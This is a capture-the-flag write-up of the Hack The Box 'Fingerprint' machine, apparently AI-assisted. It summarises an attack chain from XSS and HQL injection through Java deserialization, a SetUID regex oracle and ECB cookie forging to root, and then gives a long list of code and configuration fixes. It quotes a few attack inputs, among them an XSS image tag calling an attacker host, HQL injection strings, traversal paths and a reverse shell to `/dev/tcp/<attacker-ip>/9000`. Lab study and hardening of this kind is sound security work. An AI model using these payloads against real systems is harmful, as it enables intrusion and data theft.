---
title: "Fingerprint HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T08:00:00Z
tags: ["insane-linux", "web", "xss", "lfi", "hql-injection", "deserialization", "jwt-forging", "setuid-binary", "ecb-crypto", "privilege-escalation"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Fingerprint HTB machine featuring XSS, LFI, HQL injection, Java deserialization, JWT forging, SetUID binary exploitation, and ECB crypto attacks"
---

# Fingerprint HTB - Insane Linux Box Walkthrough

{{< youtube YBabDbyk3eo >}}

Below is a chronological summary of the key exploitation steps and techniques used in the "Fingerprint" machine from Hack The Box, as described in the provided data:

1. **Initial Reconnaissance with Nmap**:
   - Technique: Network scanning using `nmap -sC -sV -oA fingerprint <IP>`.
   - Findings: Identified open ports: SSH (22), HTTP (80, running Werkzeug on Python 2), and HTTP (8080, running Sun GlassFish 5.0.1, Java-based). Noted outdated software versions (Python 2, GlassFish ~2017-2018).

2. **Web Enumeration**:
   - Technique: Manual browsing and directory enumeration using `feroxbuster -u <URL> -B` and `wfuzz` to discover backups and potential vulnerabilities.
   - Findings: Port 80 hosts a login panel ("My Log") with a 2019 copyright, indicating Flask (Python 2). Port 8080 has a login form with a 2018 copyright. Discovered an Execute-After-Redirect (EAR) vulnerability on `/admin` (302 redirect with unusual response size, revealing `auth.log`).

3. **Cross-Site Scripting (XSS) Testing**:
   - Technique: Tested login form on port 8080 for XSS by injecting `<b>ipsec</b>` and `<img src=http://<attacker-ip>/image>`.
   - Outcome: Confirmed XSS vulnerability as user input was reflected unfiltered, and an external request was triggered to the attacker's server, indicating potential for cookie theft.

4. **Local File Inclusion (LFI) Exploitation**:
   - Technique: Tested directory traversal in the log viewing functionality (e.g., `../../etc/passwd`).
   - Outcome: Successfully accessed `/etc/passwd`, `/proc/self/cmdline` (revealing Flask on port 80), and Python source files (`app.py`, `auth.py`, `util.py`) via LFI, confirming Flask application and revealing a secret key for JWT forging.

5. **HQL Injection**:
   - Technique: Tested login form on port 8080 for HQL injection (similar to SQL injection but for Hibernate). Used payloads like `admin' OR '1'='1` and `substring(username,1,1)='m'`.
   - Outcome: Confirmed HQL injection by triggering Hibernate errors and extracting data (e.g., usernames `admin` and `michael`). Retrieved a JWT token containing a Java serialized object (base64-encoded).

6. **JWT Forging and Deserialization Vulnerability**:
   - Technique: Used the secret key from LFI to forge a JWT with a manipulated payload. Crafted a custom Java serialized object to exploit a deserialization vulnerability in the GlassFish application.
   - Steps:
     - Downloaded Java source files (`User.java`, `Profile.java`, `UserProfileStorage.java`) from `/backups`.
     - Identified a command injection vulnerability in `UserProfileStorage.java` where an admin profile triggers a shell command with the username.
     - Created a Java project in Eclipse to generate a serialized object (`ipsec.ser`) with `adminProfile=true`.
     - Uploaded `ipsec.ser` to `/data/uploads` via the application's upload functionality.
     - Forged a JWT with a username containing a directory traversal payload (`../../data/uploads/ipsec.ser`) to load the malicious serialized object.
   - Outcome: Achieved command execution by triggering a ping to the attacker's machine, later upgraded to a reverse shell (`/dev/tcp/<attacker-ip>/9000`).

7. **SetUID Binary Exploitation**:
   - Technique: Identified a SetUID binary (`/usr/bin/cmatch`) owned by user `john` using `find / -perm -4000`.
   - Analysis: `cmatch` counts matches of a pattern in a file (e.g., `cmatch /etc/passwd root` returned 3 matches). Supported regex, allowing boolean-based file content exfiltration.
   - Exploitation: Wrote a Python script to brute-force the contents of `/home/john/.ssh/id_rsa` one character at a time using regex patterns, leveraging `cmatch`'s SetUID privileges.
   - Outcome: Extracted John's SSH private key.

8. **SSH Key Cracking**:
   - Technique: Used `john` to crack the passphrase of the SSH key with a wordlist and passwords from the system (e.g., Hibernate database password `q9...`).
   - Outcome: Successfully cracked the passphrase, allowing SSH login as user `john`.

9. **Further Enumeration as John**:
   - Technique: Searched for files owned by `john` using `find / -user john`. Identified a zip file (`/var/backups/flask_app_secure.back`).
   - Outcome: Copied and unzipped the file, revealing a Flask application (`app.py`, `auth.py`) with custom crypto in ECB mode.

10. **ECB Mode Crypto Exploitation**:
    - Technique: Analyzed `app.py` and identified ECB mode encryption (block size 16 bytes) for cookies in the format `username,secret,true/false`. Exploited ECB's property where identical plaintext blocks produce identical ciphertext blocks.
    - Steps:
      - Used XSS to steal a cookie from the Flask app (port 8088, discovered via `ss -lntp` and `flaskbeta.service`).
      - Created an SSH tunnel (`ssh -L 8088:localhost:8088`) to access the app locally.
      - Wrote a Python script to brute-force the secret one byte at a time by padding usernames (e.g., 15 A's + guess) and matching ciphertext blocks.
      - Crafted a cookie with `admin,secret,true` to gain admin access.
    - Outcome: Accessed `/admin` on port 8088, revealing another LFI vulnerability.

11. **Root LFI and Privilege Escalation**:
    - Technique: Used the admin LFI on port 8088 to read `/root/.ssh/id_rsa`.
    - Outcome: Extracted the root SSH private key, used it to SSH as `root`, and achieved full system compromise.

### Summary of Techniques:
- **Reconnaissance**: Nmap, Feroxbuster, Wfuzz.
- **Web Vulnerabilities**: XSS, LFI, HQL injection.
- **Deserialization**: Custom Java serialized object crafting for command injection.
- **Binary Exploitation**: SetUID binary (`cmatch`) for file content exfiltration.
- **Crypto Exploitation**: ECB mode brute-forcing for admin cookie forging.
- **Privilege Escalation**: LFI to extract SSH keys, passphrase cracking with `john`.

This sequence reflects the chronological order of exploitation steps, leveraging multiple vulnerabilities to escalate from unauthenticated access to root privileges.

List all the gaps in each service or systems, that can be fixed with either proper source code fix or configuration fix. Below is a detailed list of the vulnerabilities (gaps) identified in the services and systems of the "Fingerprint" machine from Hack The Box, as described in the provided data. For each vulnerability, I provide a description of the gap and recommend fixes, specifying whether they involve source code changes or configuration adjustments. The fixes are designed to address the root causes of the vulnerabilities and prevent exploitation.

---

### 1. **Execute-After-Redirect (EAR) Vulnerability in Flask Application (Port 80)**
   - **Gap Description**: The `/admin` endpoint in the Flask application returns a 302 redirect but includes sensitive content (e.g., `auth.log`) in the response body, which can be intercepted by modifying the HTTP response in a tool like Burp Suite. This is due to the Flask application generating a response with `make_response(site_content)` before setting the redirect header.
   - **Impact**: Attackers can access sensitive data (e.g., log file paths) by intercepting the response, bypassing the intended redirect.
   - **Fix**:
     - **Source Code Fix**:
       - Modify the `/admin` endpoint to avoid including sensitive content in the response body before redirecting. Instead of `make_response(site_content)`, use a direct redirect without rendering content:
         ```python
         return redirect('/login', code=302)
         ```
       - Ensure no sensitive data is included in the response unless explicitly required.
     - **Configuration Fix**:
       - None directly applicable, as this is primarily a coding issue. However, ensure that web servers (e.g., Werkzeug) are configured to enforce strict HTTP response handling and log any anomalies for review.
   - **Additional Best Practice**:
     - Implement Content Security Policy (CSP) headers to prevent unintended data exposure in case of misconfigured redirects.
     - Regularly audit endpoints for unexpected response content using automated tools.

---

### 2. **Cross-Site Scripting (XSS) in Login Form (Port 8080, GlassFish)**
   - **Gap Description**: The login form on port 8080 does not sanitize user input, allowing reflected XSS via payloads like `<b>ipsec</b>` or `<img src=http://<attacker-ip>/image>`. This enables attackers to steal cookies or browser fingerprints.
   - **Impact**: Attackers can execute malicious JavaScript in the context of the victim's browser, potentially stealing session cookies or other sensitive data.
   - **Fix**:
     - **Source Code Fix**:
       - Sanitize all user inputs in the login form before rendering them. Use a library like Apache Commons Text or OWASP Java Encoder to escape HTML, JavaScript, and other special characters:
         ```java
         import org.owasp.encoder.Encode;
         String sanitizedInput = Encode.forHtml(username);
         ```
       - Alternatively, use a template engine with built-in escaping (e.g., JSP with JSTL) to ensure outputs are properly encoded.
     - **Configuration Fix**:
       - Enable a strict Content Security Policy (CSP) to restrict script sources:
         ```
         Content-Security-Policy: script-src 'self'; object-src 'none';
         ```
       - Configure the server to set the `X-XSS-Protection: 1; mode=block` header to enable browser XSS filtering (though modern browsers rely more on CSP).
   - **Additional Best Practice**:
     - Validate input on the server side using allowlists for expected characters.
     - Regularly test for XSS vulnerabilities using tools like OWASP ZAP or Burp Suite.

---

### 3. **Local File Inclusion (LFI) in Flask Application (Port 80)**
   - **Gap Description**: The log viewing functionality allows directory traversal (e.g., `../../etc/passwd`), enabling attackers to read sensitive files like `/etc/passwd`, `/proc/self/cmdline`, and Python source code (`app.py`, `auth.py`, `util.py`). The application fails to sanitize or restrict file paths.
   - **Impact**: Attackers can access sensitive system files and source code, exposing configuration details, secret keys, and other critical information.
   - **Fix**:
     - **Source Code Fix**:
       - Implement strict path validation to ensure only authorized files can be accessed. Use a whitelist of allowed file names and restrict access to a specific directory:
         ```python
         import os
         ALLOWED_FILES = {'auth.log'}
         def view_log(filename):
             if filename not in ALLOWED_FILES:
                 return "Invalid file", 403
             safe_path = os.path.join('/var/log/app', filename)
             if not os.path.realpath(safe_path).startswith('/var/log/app'):
                 return "Access denied", 403
             # Proceed with file reading
         ```
       - Avoid using user input directly in file paths without normalization and validation.
     - **Configuration Fix**:
       - Restrict file system permissions to ensure the Flask application runs with minimal privileges (e.g., non-root user with access only to necessary directories).
       - Configure the web server (e.g., Werkzeug or a reverse proxy like Nginx) to block requests with suspicious characters like `../` using URL filtering rules.
   - **Additional Best Practice**:
     - Use a Web Application Firewall (WAF) to detect and block directory traversal attempts.
     - Regularly audit file access logs to identify unauthorized access attempts.

---

### 4. **HQL Injection in GlassFish Application (Port 8080)**
   - **Gap Description**: The login form on port 8080 is vulnerable to HQL injection due to unsanitized user input in Hibernate queries. Payloads like `admin' OR '1'='1` or `substring(username,1,1)='m'` allow attackers to extract database information (e.g., usernames, fingerprints) and bypass authentication.
   - **Impact**: Attackers can extract sensitive data from the database or authenticate as arbitrary users, obtaining JWT tokens.
   - **Fix**:
     - **Source Code Fix**:
       - Use parameterized queries (Prepared Statements) in Hibernate to prevent injection:
         ```java
         Query query = session.createQuery("FROM User WHERE username = :username");
         query.setParameter("username", username);
         ```
       - Avoid concatenating user input directly into HQL queries.
     - **Configuration Fix**:
       - Configure Hibernate to use strict query validation and logging to detect malformed queries.
       - Limit database permissions to the application user, restricting access to only necessary tables and operations (e.g., SELECT-only for authentication queries).
   - **Additional Best Practice**:
     - Implement input validation to reject unexpected characters (e.g., quotes, SQL/HQL keywords).
     - Use an ORM configuration that enforces type safety and restricts query capabilities to prevent advanced exploits like boolean-based blind injections.

---

### 5. **Java Deserialization Vulnerability in GlassFish Application (Port 8080)**
   - **Gap Description**: The application processes a JWT token containing a base64-encoded Java serialized object, which is deserialized without validation. The `UserProfileStorage.java` class executes a shell command if `adminProfile=true`, and the `username` field is used unsanitized, allowing command injection via a crafted serialized object.
   - **Impact**: Attackers can achieve arbitrary command execution by uploading a malicious serialized object and forging a JWT to trigger it.
   - **Fix**:
     - **Source Code Fix**:
       - Avoid deserialization of untrusted input. If deserialization is necessary, use a strict allowlist of expected classes:
         ```java
         import java.io.ObjectInputFilter;
         ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.admin.security.source.User;!*");
         ObjectInputStream ois = new ObjectInputStream(inputStream);
         ois.setObjectInputFilter(filter);
         ```
       - Remove the command execution logic from `UserProfileStorage.java`. Replace it with a safer mechanism (e.g., database-driven authorization):
         ```java
         if (profile.isAdminProfile()) {
             // Perform safe operation, e.g., database update
         }
         ```
       - Sanitize the `username` field to prevent command injection:
         ```java
         if (!username.matches("^[a-zA-Z0-9]+$")) {
             throw new IllegalArgumentException("Invalid username");
         }
         ```
     - **Configuration Fix**:
       - Configure the Java runtime to enable deserialization filters (Java 9+):
         ```bash
         java -Djdk.serialFilter="com.admin.security.source.User;!*"
         ```
       - Run the GlassFish server with minimal privileges (non-root user) to limit the impact of command execution.
   - **Additional Best Practice**:
     - Use JSON or other safer data formats instead of Java serialization for JWT payloads.
     - Regularly audit dependencies for known deserialization vulnerabilities (e.g., using tools like OWASP Dependency-Check).

---

### 6. **Insecure JWT Secret Key Exposure via LFI**
   - **Gap Description**: The Flask application's LFI vulnerability exposed the secret key used to sign JWTs in `app.py`. This allowed attackers to forge valid JWT tokens.
   - **Impact**: Attackers can forge JWTs to impersonate users or manipulate payloads, enabling further exploits like deserialization attacks.
   - **Fix**:
     - **Source Code Fix**:
       - Store sensitive keys in environment variables or a secure configuration file outside the web root:
         ```python
         import os
         SECRET_KEY = os.getenv('JWT_SECRET_KEY')
         ```
       - Ensure the secret key is cryptographically secure (e.g., generated with sufficient entropy):
         ```python
         import secrets
         SECRET_KEY = secrets.token_hex(32)
         ```
     - **Configuration Fix**:
       - Restrict file system access to prevent LFI (see LFI fix above).
       - Store configuration files in a directory inaccessible to the web server (e.g., `/etc/flaskapp/config` with permissions `600` and owned by a non-web user).
       - Use a secrets management solution (e.g., HashiCorp Vault, AWS Secrets Manager) to manage and rotate keys securely.
   - **Additional Best Practice**:
     - Rotate JWT secret keys regularly and invalidate old tokens.
     - Implement token validation checks (e.g., expiration, audience) to limit the impact of forged tokens.

---

### 7. **SetUID Binary Vulnerability (`cmatch`)**
   - **Gap Description**: The SetUID binary `/usr/bin/cmatch` (owned by user `john`) allows regex-based file content matching, enabling boolean-based exfiltration of sensitive files (e.g., `/home/john/.ssh/id_rsa`) one character at a time when run by a lower-privileged user.
   - **Impact**: Attackers can extract sensitive data from files readable by the `john` user, such as SSH private keys.
   - **Fix**:
     - **Source Code Fix**:
       - Restrict `cmatch` to only process specific files or patterns:
         ```c
         if (strcmp(filename, "/var/log/allowed.log") != 0) {
             fprintf(stderr, "Access denied\n");
             return 1;
         }
         ```
       - Remove regex support if not needed, or sanitize regex patterns to prevent complex queries:
         ```c
         if (strstr(pattern, "[") || strstr(pattern, "^")) {
             fprintf(stderr, "Complex regex not allowed\n");
             return 1;
         }
         ```
     - **Configuration Fix**:
       - Remove the SetUID bit from `cmatch` if not required:
         ```bash
         chmod u-s /usr/bin/cmatch
         ```
       - Restrict access to `cmatch` to specific users or groups:
         ```bash
         chown root:john /usr/bin/cmatch
         chmod 750 /usr/bin/cmatch
         ```
       - Use AppArmor or SELinux to confine `cmatch` to specific files and operations.
   - **Additional Best Practice**:
     - Audit all SetUID/SetGID binaries on the system (`find / -perm -4000`) and remove unnecessary ones.
     - Monitor execution of SetUID binaries using auditd or similar tools.

---

### 8. **Weak SSH Key Passphrase**
   - **Gap Description**: The SSH private key for user `john` was protected by a weak passphrase, crackable using `john` with a wordlist and system-derived passwords (e.g., Hibernate database password).
   - **Impact**: Attackers can gain unauthorized access to the `john` account via SSH after extracting the key.
   - **Fix**:
     - **Configuration Fix**:
       - Enforce strong passphrase policies for SSH keys using tools like `ssh-keygen` with minimum length and complexity requirements.
       - Disable password-based SSH authentication in `/etc/ssh/sshd_config`:
         ```bash
         PasswordAuthentication no
         ```
       - Use a key management solution to generate and store strong passphrases securely.
     - **Additional Best Practice**:
       - Regularly rotate SSH keys and passphrases.
       - Implement multi-factor authentication (MFA) for SSH access (e.g., using PAM modules or SSH key + TOTP).

---

### 9. **ECB Mode Encryption in Flask Beta Application (Port 8088)**
   - **Gap Description**: The Flask application on port 8088 uses ECB mode encryption for cookies in the format `username,secret,true/false`. ECB's lack of diffusion allows attackers to brute-force the secret one byte at a time by matching ciphertext blocks.
   - **Impact**: Attackers can forge admin cookies (e.g., `admin,secret,true`) to gain unauthorized access to the `/admin` endpoint.
   - **Fix**:
     - **Source Code Fix**:
       - Replace ECB with a secure encryption mode like CBC or GCM, which provide diffusion and authentication:
         ```python
         from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
         key = os.urandom(32)
         iv = os.urandom(16)
         cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
         ```
       - Use HMAC for cookie integrity instead of relying on encryption alone:
         ```python
         import hmac
         import hashlib
         cookie = f"{username},{secret},{is_admin}"
         mac = hmac.new(key, cookie.encode(), hashlib.sha256).hexdigest()
         final_cookie = f"{cookie}:{mac}"
         ```
       - Validate cookie format and content before processing:
         ```python
         if not re.match(r"^[a-zA-Z0-9]+,[a-zA-Z0-9]+,(true|false)$", cookie):
             return "Invalid cookie", 403
         ```
     - **Configuration Fix**:
       - Ensure cryptographic keys are securely generated and stored (e.g., in environment variables or a secrets manager).
       - Rotate encryption keys regularly and invalidate old cookies.
   - **Additional Best Practice**:
     - Use established libraries like `itsdangerous` for secure cookie signing in Flask.
     - Test cryptographic implementations for vulnerabilities using tools like Cryptosense or manual audits.

---

### 10. **LFI in Flask Beta Application (Port 8088, Admin Endpoint)**
   - **Gap Description**: The `/admin` endpoint in the Flask beta application allows LFI when accessed with an admin cookie, enabling attackers to read sensitive files like `/root/.ssh/id_rsa`.
   - **Impact**: Attackers can extract the root SSH private key, leading to full system compromise.
   - **Fix**:
     - **Source Code Fix**:
       - Implement strict file path validation (similar to the LFI fix for port 80):
         ```python
         ALLOWED_FILES = {'auth.log'}
         def view_admin_log(filename):
             if filename not in ALLOWED_FILES:
                 return "Invalid file", 403
             safe_path = os.path.join('/var/log/app', filename)
             if not os.path.realpath(safe_path).startswith('/var/log/app'):
                 return "Access denied", 403
             # Proceed with file reading
         ```
       - Add authentication and authorization checks to ensure only legitimate admins can access the endpoint:
         ```python
         if not session.get('is_admin'):
             return redirect('/login', code=302)
         ```
     - **Configuration Fix**:
       - Restrict file system permissions for the Flask application user to prevent access to sensitive directories (e.g., `/root`).
       - Configure a reverse proxy (e.g., Nginx) to block requests with suspicious paths:
         ```nginx
         location /admin {
             if ($request_uri ~ "\.\./") {
                 return 403;
             }
         }
         ```
   - **Additional Best Practice**:
     - Use a WAF to block directory traversal patterns.
     - Log and monitor file access attempts to detect unauthorized access.

---

### 11. **Outdated Software (Python 2, GlassFish 5.0.1)**
   - **Gap Description**: The system runs Python 2 (end-of-life since 2020) on port 80 and Sun GlassFish 5.0.1 (~2017-2018) on port 8080, both outdated and potentially vulnerable to known exploits.
   - **Impact**: Outdated software increases the attack surface, as unpatched vulnerabilities (e.g., CVEs in GlassFish) may exist.
   - **Fix**:
     - **Configuration Fix**:
       - Upgrade Python to a supported version (e.g., Python 3.10+):
         ```bash
         apt remove python2
         apt install python3
         ```
       - Upgrade GlassFish to a supported version (e.g., Eclipse GlassFish 7.x) or migrate to a modern alternative like Apache Tomcat:
         ```bash
         apt install tomcat9
         ```
       - Regularly apply security patches to all software components.
     - **Additional Best Practice**:
       - Use a dependency management tool (e.g., Dependabot) to monitor and update software versions.
       - Scan for CVEs using tools like Nessus or OpenVAS.

---

### 12. **Unnecessary Exposure of Sensitive Files (WAR File, Source Code)**
   - **Gap Description**: The `/backups` directory on port 8080 exposes Java source code (`User.java`, `Profile.java`, `UserProfileStorage.java`) and a WAR file (`internal_app.war`), accessible without authentication. These files contain sensitive information like application logic and database credentials.
   - **Impact**: Attackers can analyze source code to identify vulnerabilities and extract credentials (e.g., Hibernate password).
   - **Fix**:
     - **Configuration Fix**:
       - Restrict access to the `/backups` directory using web server configuration:
         ```xml
         <!-- GlassFish web.xml -->
         <security-constraint>
             <web-resource-collection>
                 <web-resource-name>Backups</web-resource-name>
                 <url-pattern>/backups/*</url-pattern>
             </web-resource-collection>
             <auth-constraint>
                 <role-name>admin</role-name>
             </auth-constraint>
         </security-constraint>
         ```
       - Move sensitive files (e.g., source code, WAR files) outside the web root and restrict access:
         ```bash
         mv /path/to/backups /secure/location
         chmod 700 /secure/location
         ```
     - **Source Code Fix**:
       - Avoid storing sensitive files in publicly accessible directories. Use a build process to exclude source code and WAR files from deployment.
     - **Additional Best Practice**:
       - Implement access logging and monitoring to detect unauthorized access to sensitive directories.
       - Use a CI/CD pipeline to ensure only compiled artifacts are deployed.

---

### 13. **Weak Database Credentials in WAR File**
   - **Gap Description**: The `internal_app.war` file contains hardcoded Hibernate credentials (`hdb:q9...`), which were used to crack the SSH key passphrase due to password reuse.
   - **Impact**: Attackers can access the database and extract sensitive data, and reused passwords enable further privilege escalation.
   - **Fix**:
     - **Source Code Fix**:
       - Remove hardcoded credentials from source code and WAR files. Use environment variables or a configuration file:
         ```java
         String dbPassword = System.getenv("DB_PASSWORD");
         ```
     - **Configuration Fix**:
       - Store database credentials in a secure location (e.g., `/etc/app/db.conf` with `600` permissions).
       - Use a secrets management solution (e.g., HashiCorp Vault) to manage credentials.
       - Enforce strong, unique passwords for all accounts and services.
     - **Additional Best Practice**:
       - Implement least privilege for database users (e.g., restrict `hdb` to specific tables).
       - Rotate credentials regularly and monitor for password reuse across services.

---

### 14. **Unnecessary Open Ports and Services**
   - **Gap Description**: The system exposes multiple ports (22, 80, 8080, 8088, etc.) and services (SSH, Flask, GlassFish, Flask beta), some of which may not be necessary for the application's functionality.
   - **Impact**: Unnecessary open ports increase the attack surface, providing more entry points for exploitation.
   - **Fix**:
     - **Configuration Fix**:
       - Disable unused services in `systemd`:
         ```bash
         systemctl disable flaskbeta
         systemctl stop flaskbeta
         ```
       - Configure the firewall to allow only necessary ports (e.g., 22, 80):
         ```bash
         ufw allow 22
         ufw allow 80
         ufw deny 8080
         ufw deny 8088
         ufw enable
         ```
       - Bind services to specific interfaces (e.g., `localhost` for internal services like Flask beta):
         ```bash
         # In /etc/systemd/system/flaskbeta.service
         ExecStart=/usr/bin/python3 app.py --host=127.0.0.1 --port=8088
         ```
     - **Additional Best Practice**:
       - Conduct regular port scans to identify and close unnecessary open ports.
       - Use network segmentation to isolate internal services from external access.

---

### Summary of Fixes
- **Source Code Fixes**: Address EAR, XSS, LFI, HQL injection, deserialization, JWT handling, SetUID binary logic, ECB encryption, and hardcoded credentials through proper input validation, secure coding practices, and removal of unsafe functionality.
- **Configuration Fixes**: Restrict file system and network access, enforce strong authentication, update outdated software, secure credentials, and limit service exposure.
- **Best Practices**: Implement CSP, WAF, secrets management, regular audits, and monitoring to enhance overall security.

By applying these fixes, the identified vulnerabilities can be mitigated, significantly reducing the risk of exploitation and securing the system against similar attacks.